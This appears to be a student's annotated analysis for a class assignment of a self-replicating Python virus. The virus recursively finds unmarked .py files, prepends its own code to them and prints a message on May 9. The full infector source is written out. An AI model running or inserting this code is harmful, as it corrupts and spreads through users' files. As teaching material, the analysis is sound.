# Script: Ops 301 Class 13 Ops Challenge
# Author: Spencer Mitchell
# Date of latest revision: 3/28/23
# Purpose: Perform an analysis of the Python-based code.
# Resources: ChatGPT helped with the explaination of some of the code blocks.





#!/usr/bin/python3

# lets the user interact with the native OS python that is running
import os
# supplies classes for manipulating dates and times.
import datetime

# this is a variable named virus
SIGNATURE = "VIRUS"
# Create an empty list called "files_targeted" to store the names of files that meet the criteria.
def locate(path):
    files_targeted = []
    # Use the "os" module to get a list of all files in the directory specified by the "path" argument. This list is stored in the "filelist" variable.
    filelist = os.listdir(path)
    # Loop through each file in "filelist".
    for fname in filelist:
        # If the current file is a directory (as determined by the "os.path.isdir()" function), call the "locate()" function recursively with the subdirectory path, and append the resulting list to the "files_targeted" list.
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        # If the current file has a ".py" extension (as determined by checking the last three characters of the filename), read through the file line by line to look for a specific "SIGNATURE" string. If the signature is not found, append the file path to the "files_targeted" list.    
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    # After all files in "filelist" have been checked, return the "files_targeted" list.
    return files_targeted

# The "infect" function takes a single argument, "files_targeted", which is a list of file paths.
def infect(files_targeted):
    # The function first opens the current script file using the "open" function from the "os" module. The "os.path.abspath(file)" expression returns the absolute path of the current script file. The script file is opened in read mode, and the resulting file object is stored in the "virus" variable.
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    # The function then reads the first 39 lines of the script file and concatenates them into a single string, which is stored in the "virusstring" variable.
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    # The function closes the script file using the "close" method of the file object.
    virus.close
    # The function then loops through each file path in the "files_targeted" list.
    for fname in files_targeted:
        # For each file, the function opens the file in read mode, reads its contents into the "temp" variable, and closes the file.
        f = open(fname)
        temp = f.read()
        f.close()
        # The function then opens the file in write mode, overwrites its contents with the concatenated "virusstring" and "temp" strings, and closes the file.
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
# The "detonate" function checks whether the current date is May 9th using the "datetime.datetime.now()" function from the "datetime" module. If the month is 5 and the day is 9, the function prints a message to the console.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")
# The "files_targeted" variable is set to the result of calling the "locate" function with the absolute path of the current directory as an argument.
files_targeted = locate(os.path.abspath(""))
# The "infect" function is called with the "files_targeted" list as an argument, causing the files to be infected with the virus.
infect(files_targeted)
# The "detonate" function is called, potentially triggering the print statement if the date is May 9th.
detonate()
